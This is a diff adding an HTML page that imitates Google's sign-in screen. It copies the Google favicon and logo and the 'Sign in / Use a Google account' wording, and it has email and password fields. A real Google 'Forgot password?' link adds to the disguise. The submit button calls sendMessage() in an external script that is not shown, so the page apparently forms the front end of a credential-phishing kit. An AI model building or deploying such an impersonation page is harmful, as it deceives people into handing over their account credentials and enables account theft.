@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="Icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Khojki&display=swap" rel="stylesheet">
+    <title>Google Login</title>
+</head>
+<body>
+    <div class="box">
+        <div id="logo" class="google-logo" title="Google">
+          <img src="img/Google_Logo.jpg" alt="could't load the logo" class="logo_i">
+        </div>
+        <div class="form">
+            <h2>Sign in</h2>
+            <p>Use a Google account</p>
+            <form>
+              <div class="inputBox">
+                <input type="email" name="username" id="username" required="" onkeyup="this.setAttribute('value', this.value);" value="" aria-required="true" maxlength="40" autocapitalize="off" autocorrect="off" name="username" required>
+                <label>E-mail address or telephone number</label>
+              </div>
+              <div class="inputBox">
+                    <input type="password" name="password" id="password" required="" onkeyup="this.setAttribute('value', this.value);" value="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    <label>Password</label>
+              </div>
+              <div class="forgot">
+                  <a href="https://accounts.google.com/&ifkv=ARZ0qKJyuHBK">Forgot password?</a>
+              </div>
+              <input type="submit" name="submit" value="Sign In" class="btn" onclick="sendMessage()">
+          </form>
+      </div>
+      <script src="js/script.js"></script>
+</body>
+</html>
